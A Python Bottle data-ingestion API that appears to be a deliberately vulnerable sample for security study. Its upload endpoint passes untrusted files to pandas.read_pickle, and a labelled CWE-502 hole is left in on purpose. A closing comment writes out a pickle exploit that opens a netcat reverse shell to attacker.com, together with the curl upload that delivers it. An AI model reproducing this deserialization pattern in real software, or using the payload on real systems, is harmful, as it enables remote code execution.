import os
import io
import uuid
import sqlite3
import logging
import pandas as pd
from datetime import datetime
from bottle import Bottle, request, response, run, HTTPResponse

# Configure logging for the Data Ingestion Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - DataIngest - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PandasIngestionAPI")

app = Bottle()
DB_FILE = "ingestion_jobs.db"

def init_ingestion_db():
    """Initializes the SQLite database for tracking data ingestion tasks."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE ingestion_logs (
            job_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT NOT NULL,
            file_size INTEGER,
            row_count INTEGER,
            status TEXT NOT NULL
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('job_998877', datetime.now().isoformat(), '10.0.0.5', 45000, 1500, 'SUCCESS'),
        ('job_665544', datetime.now().isoformat(), '10.0.0.6', 0, 0, 'FAILED')
    ]
    cursor.executemany('''
        INSERT INTO ingestion_logs (job_id, timestamp, client_ip, file_size, row_count, status)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Ingestion tracking database initialized.")

def log_ingestion_job(job_id: str, client_ip: str, file_size: int, row_count: int, status: str):
    """Records the outcome of a DataFrame ingestion request."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO ingestion_logs (job_id, client_ip, file_size, row_count, status) VALUES (?, ?, ?, ?, ?)",
            (job_id, client_ip, file_size, row_count, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging job {job_id}: {e}")

def process_serialized_dataframe(file_data: bytes, job_id: str) -> int:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: HTTP Multipart File Upload (Pandas Pickle .pkl file)
    """
    logger.info(f"[{job_id}] Initiating dataframe deserialization.")
    
    try:
        # Vulnerability: The application uses pandas.read_pickle() to parse the uploaded 
        # serialized dataset. Under the hood, pandas relies entirely on Python's native 
        # pickle module to load these files. Pickling is inherently unsafe, and loading 
        # an untrusted .pkl file allows an attacker to execute arbitrary system commands 
        # during the deserialization phase (e.g., via a malicious __reduce__ method).
        
        buffer = io.BytesIO(file_data)
        
        # CWE-502 occurs instantly upon pandas reading the malicious pickle stream.
        df = pd.read_pickle(buffer)
        
        if isinstance(df, pd.DataFrame):
            row_count = len(df)
            logger.debug(f"[{job_id}] Successfully loaded DataFrame with {row_count} rows.")
            # (In a real application, the dataframe would be pushed to a data warehouse here)
            return row_count
        else:
            logger.warning(f"[{job_id}] Loaded object is not a pandas DataFrame.")
            return -1
            
    except Exception as e:
        logger.error(f"[{job_id}] Failed to deserialize pandas DataFrame: {e}")
        return -1

@app.route('/api/v1/health', method='GET')
def health_check():
    """Simple health check endpoint."""
    response.content_type = 'application/json'
    return '{"status": "Data Ingestion API is active."}'

@app.route('/api/v1/ingest', method='POST')
def ingest_data():
    """Endpoint to upload new serialized pandas DataFrames."""
    client_ip = request.remote_addr
    job_id = f"job_{uuid.uuid4().hex[:8]}"
    
    upload = request.files.get('dataset')
    if not upload:
        logger.warning(f"[{job_id}] Ingestion failed: No dataset provided by {client_ip}.")
        log_ingestion_job(job_id, client_ip, 0, 0, "FAILED")
        return HTTPResponse(status=400, body='{"error": "Missing \'dataset\' in form data"}')
        
    try:
        # Read the uploaded binary data into memory
        file_data = upload.file.read()
        file_size = len(file_data)
        logger.info(f"[{job_id}] Received {file_size} bytes from {client_ip}")
        
        if file_size > 10 * 1024 * 1024:  # 10MB limit
            log_ingestion_job(job_id, client_ip, file_size, 0, "REJECTED_SIZE")
            return HTTPResponse(status=413, body='{"error": "Dataset exceeds 10MB limit"}')
        
        # Pass the untrusted file data directly to the vulnerable function
        row_count = process_serialized_dataframe(file_data, job_id)
        
        if row_count >= 0:
            log_ingestion_job(job_id, client_ip, file_size, row_count, "SUCCESS")
            response.content_type = 'application/json'
            return f'{{"message": "Dataset ingested successfully", "job_id": "{job_id}", "rows": {row_count}}}'
        else:
            log_ingestion_job(job_id, client_ip, file_size, 0, "FAILED_PROCESSING")
            return HTTPResponse(status=422, body='{"error": "Failed to process dataset file"}')
            
    except Exception as e:
        logger.error(f"[{job_id}] Internal server error handling upload: {e}")
        log_ingestion_job(job_id, client_ip, 0, 0, "ERROR")
        return HTTPResponse(status=500, body='{"error": "Internal server error"}')

if __name__ == "__main__":
    init_ingestion_db()
    
    logger.info("Starting Bottle Data Ingestion Service on http://0.0.0.0:8081")
    
    # Example Malicious Trigger:
    # 1. Attacker generates a malicious .pkl file:
    #    import pandas as pd
    #    import os
    #    import pickle
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    # pd.read_pickle blindly passes the payload to Python's builtin pickle
    #    with open('malicious.pkl', 'wb') as f:
    #        pickle.dump(Exploit(), f)
    #
    # 2. Attacker uploads the payload to the API:
    #    curl -X POST -F "dataset=@malicious.pkl" http://127.0.0.1:8081/api/v1/ingest
    
    run(app, host='0.0.0.0', port=8081, quiet=True)
